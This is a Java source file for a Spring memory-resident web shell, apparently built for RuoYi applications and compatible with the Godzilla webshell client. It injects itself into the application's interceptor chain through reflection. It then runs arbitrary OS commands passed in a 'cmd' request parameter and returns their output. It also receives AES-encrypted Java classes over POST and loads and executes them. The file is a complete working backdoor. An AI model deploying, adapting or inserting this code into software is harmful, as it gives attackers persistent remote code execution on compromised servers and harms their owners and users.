package artsploit;

import org.springframework.web.servlet.HandlerInterceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ArrayList;
import java.util.Scanner;

public class GodzillaInterceptor implements HandlerInterceptor {

//    private final String k = "e45e329feb5d925b";

    private final String xc = "3c6e0b8a9c15224a";
    private final String pass = "pass";
    private final String md5 = md5(pass + xc);

    Class payload;


//    public Class g(byte[] b) throws Exception {
//        // To get ClassLoader and invoke the protected final Method of ClassLoader
//        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
//        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
//        Field modifiers = defineClass.getClass().getDeclaredField("modifiers");
//        modifiers.setAccessible(true);
//        modifiers.setInt(defineClass, defineClass.getModifiers() & ~Modifier.FINAL & ~Modifier.STATIC | Modifier.PUBLIC);
//
//        return (Class) defineClass.invoke(classLoader, b, 0, b.length);
//    }

    public GodzillaInterceptor() throws Exception {
        ArrayList<Object> adaptedInterceptors = getAdaptedInterceptors();
        for (int i = adaptedInterceptors.size() - 1; i > 0; i--) {
            if (adaptedInterceptors.get(i) instanceof GodzillaInterceptor) {
                return;
            }
        }
        adaptedInterceptors.add(this);
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String cmd = request.getParameter("cmd");
        String header = request.getHeader("X-Cmd-Ruoyi");

        if (cmd != null && cmd.equals("delete")) {
            ArrayList<Object> adaptedInterceptors = getAdaptedInterceptors();
            for (int i = adaptedInterceptors.size() - 1; i > 0; i--) {
                if (adaptedInterceptors.get(i) instanceof GodzillaInterceptor) {
                    adaptedInterceptors.remove(i);
                }
            }
        } else if (cmd != null && request.getMethod().equals("GET")) {
            PrintWriter writer = response.getWriter();
            String o = "";
            ProcessBuilder p;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                p = new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd});
            } else {
                p = new ProcessBuilder(new String[]{"/bin/sh", "-c", cmd});
            }
            Scanner c = new Scanner(p.start().getInputStream()).useDelimiter("\\A");
            o = c.hasNext() ? c.next() : o;
            c.close();
            writer.write(o);
            writer.flush();
            writer.close();
        } else if (cmd != null && header != null && request.getMethod().equals("POST")) {
//            HttpSession session = request.getSession();
//            session.setAttribute("u", this.k);
//            Cipher c = Cipher.getInstance("AES");
//            c.init(2, new SecretKeySpec(this.k.getBytes(), "AES"));
//
//            TestInterceptor testInterceptor = new TestInterceptor();
//            String base64String = request.getReader().readLine();
//            System.out.println(base64String);
//            byte[] bytesEncrypted = new Base64().decode(base64String);
//            byte[] bytesDecrypted = c.doFinal(bytesEncrypted);
//            Class newClass = testInterceptor.g(bytesDecrypted);
//
//            Map<String, Object> pageContext = new HashMap<String, Object>();
//            pageContext.put("session", session);
//            pageContext.put("request", request);
//            pageContext.put("response", response);
//            newClass.newInstance().equals(pageContext);

            // godzilla 代码逻辑
            byte[] data = base64Decode(request.getParameter(pass));
            data = x(data, false);
            if (payload == null) {
                try {
                    payload = defClass(data);
                } catch (Throwable e) {
                    throw new RuntimeException(e);
                }
            } else {
                java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                Object f = payload.newInstance();
                f.equals(arrOut);
                f.equals(data);
                f.equals(request);
                response.getWriter().write(md5.substring(0, 16));
                f.toString();
                response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
                response.getWriter().write(md5.substring(16));
            }

        }
        return true;
    }

    // 获取所有的 adaptedInterceptors
    private ArrayList<Object> getAdaptedInterceptors() throws NoSuchFieldException, ClassNotFoundException, IllegalAccessException {
        Field f = Thread.currentThread().getContextClassLoader().loadClass("com.ruoyi.common.utils.spring.SpringUtils").getDeclaredField("applicationContext");
        f.setAccessible(true);
        org.springframework.web.context.WebApplicationContext context = (org.springframework.web.context.WebApplicationContext) f.get(null);
        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean("requestMappingHandlerMapping");
        Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        ArrayList<Object> adaptedInterceptors = (ArrayList<Object>) field.get(abstractHandlerMapping);
        return adaptedInterceptors;
    }

    // 哥斯拉工具方法
    public byte[] x(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }

    public Class defClass(byte[] classBytes) throws Throwable {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defMethod.setAccessible(true);
        return (Class) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
    }
}
